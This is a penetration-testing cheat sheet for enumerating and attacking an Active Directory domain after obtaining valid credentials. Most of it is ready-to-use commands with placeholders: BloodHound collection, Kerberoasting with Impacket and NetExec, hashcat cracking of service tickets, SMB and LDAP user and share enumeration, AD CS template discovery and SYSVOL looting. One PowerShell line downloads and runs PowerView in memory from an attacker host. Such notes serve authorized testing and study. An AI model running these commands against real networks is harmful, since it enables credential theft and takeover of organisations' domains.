---
title: AD Post-Creds Enum
type: note
tab: Active Directory
inputs: [Username, Password]
outputs: [Users, Groups, Shares, Hash, Paths]
tags: [ActiveDirectory, Enumeration, Kerberos, SMB, LDAP]
---

# AD Post-Creds Enum

## WHY

Map the domain attack surface after the first valid credential.

## WHEN

- You have valid domain creds.
- You need a path to local admin or DA.

## NEXT

- BloodHound path found: [[Privesc]]
- Local admin found: [[Lateral_Movement]]
- Kerberos hash found: [[../Credentials/Hash Crack]]

## Commands

### BloodHound Collection

#Username #Password #LDAP #ActiveDirectory #Enumeration
Collect BloodHound data with NetExec.

```sh
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --dns-server <DC_IP> --bloodhound --collection All
```

#Username #Password #ActiveDirectory #Enumeration
Collect BloodHound data with `bloodhound-python`.

```sh
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -v --zip -c All,LoggedOn -dc <DC_HOST> -ns <DC_IP>
```

#ActiveDirectory #Enumeration
Start the BloodHound GUI with Electron sandboxing disabled if needed.

```sh
./BloodHound --no-sandbox --disable-gpu
```

### Kerberoast

#Username #Password #Kerberos #ActiveDirectory #Exploitation
Kerberoast with Impacket.

```sh
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile tgs.hashes
```

#Username #Password #Kerberos #ActiveDirectory #Exploitation
Kerberoast with NetExec.

```sh
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting tgs.hashes
```

#Hash #Crack #Kerberos #ActiveDirectory
Crack Kerberoast hash.

```sh
hashcat -m 13100 tgs.hashes <WORDLIST>
```

### SMB / LDAP Enum

#Username #Password #SMB #ActiveDirectory #Enumeration
Enumerate users, groups, and shares over SMB.

```sh
nxc smb <DC_IP> -u <USER> -p '<PASS>' --users
nxc smb <DC_IP> -u <USER> -p '<PASS>' --groups
nxc smb <DC_IP> -u <USER> -p '<PASS>' --shares
```

#Username #Password #LDAP #ActiveDirectory #Enumeration
Enumerate users and groups over LDAP.

```sh
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --groups
```

#Username #Password #SMB #ActiveDirectory #Enumeration
Check password policy.

```sh
nxc smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol
```

### PowerView

#Shell #ActiveDirectory #Enumeration
Load PowerView directly into memory from the attacker host.

```powershell
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX
```

#Shell #ActiveDirectory #Enumeration
Use PowerView to identify DCs, privileged groups, and local admin access.

```powershell
Get-DomainController
Get-DomainController | Select-Object Name
Find-LocalAdminAccess
Get-DomainGroup -Name "Domain Admins"
```

### AD CS

#Username #Password #ActiveDirectory #Enumeration
Find vulnerable AD CS templates.

```sh
certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> -vulnerable
```

### SYSVOL Looting

#Username #Password #SMB #ActiveDirectory #Looting
Search SYSVOL for interesting files.

```sh
smbclient //<DC_IP>/SYSVOL -U '<DOMAIN>/<USER>%<PASS>'
```

## Gotchas

- BloodHound collection is usually the fastest route to a privesc path.
- Kerberoast requires valid creds or an existing Kerberos-authenticated context, but not elevated privileges.
- Check AD CS early; one vulnerable template can shortcut to DA.
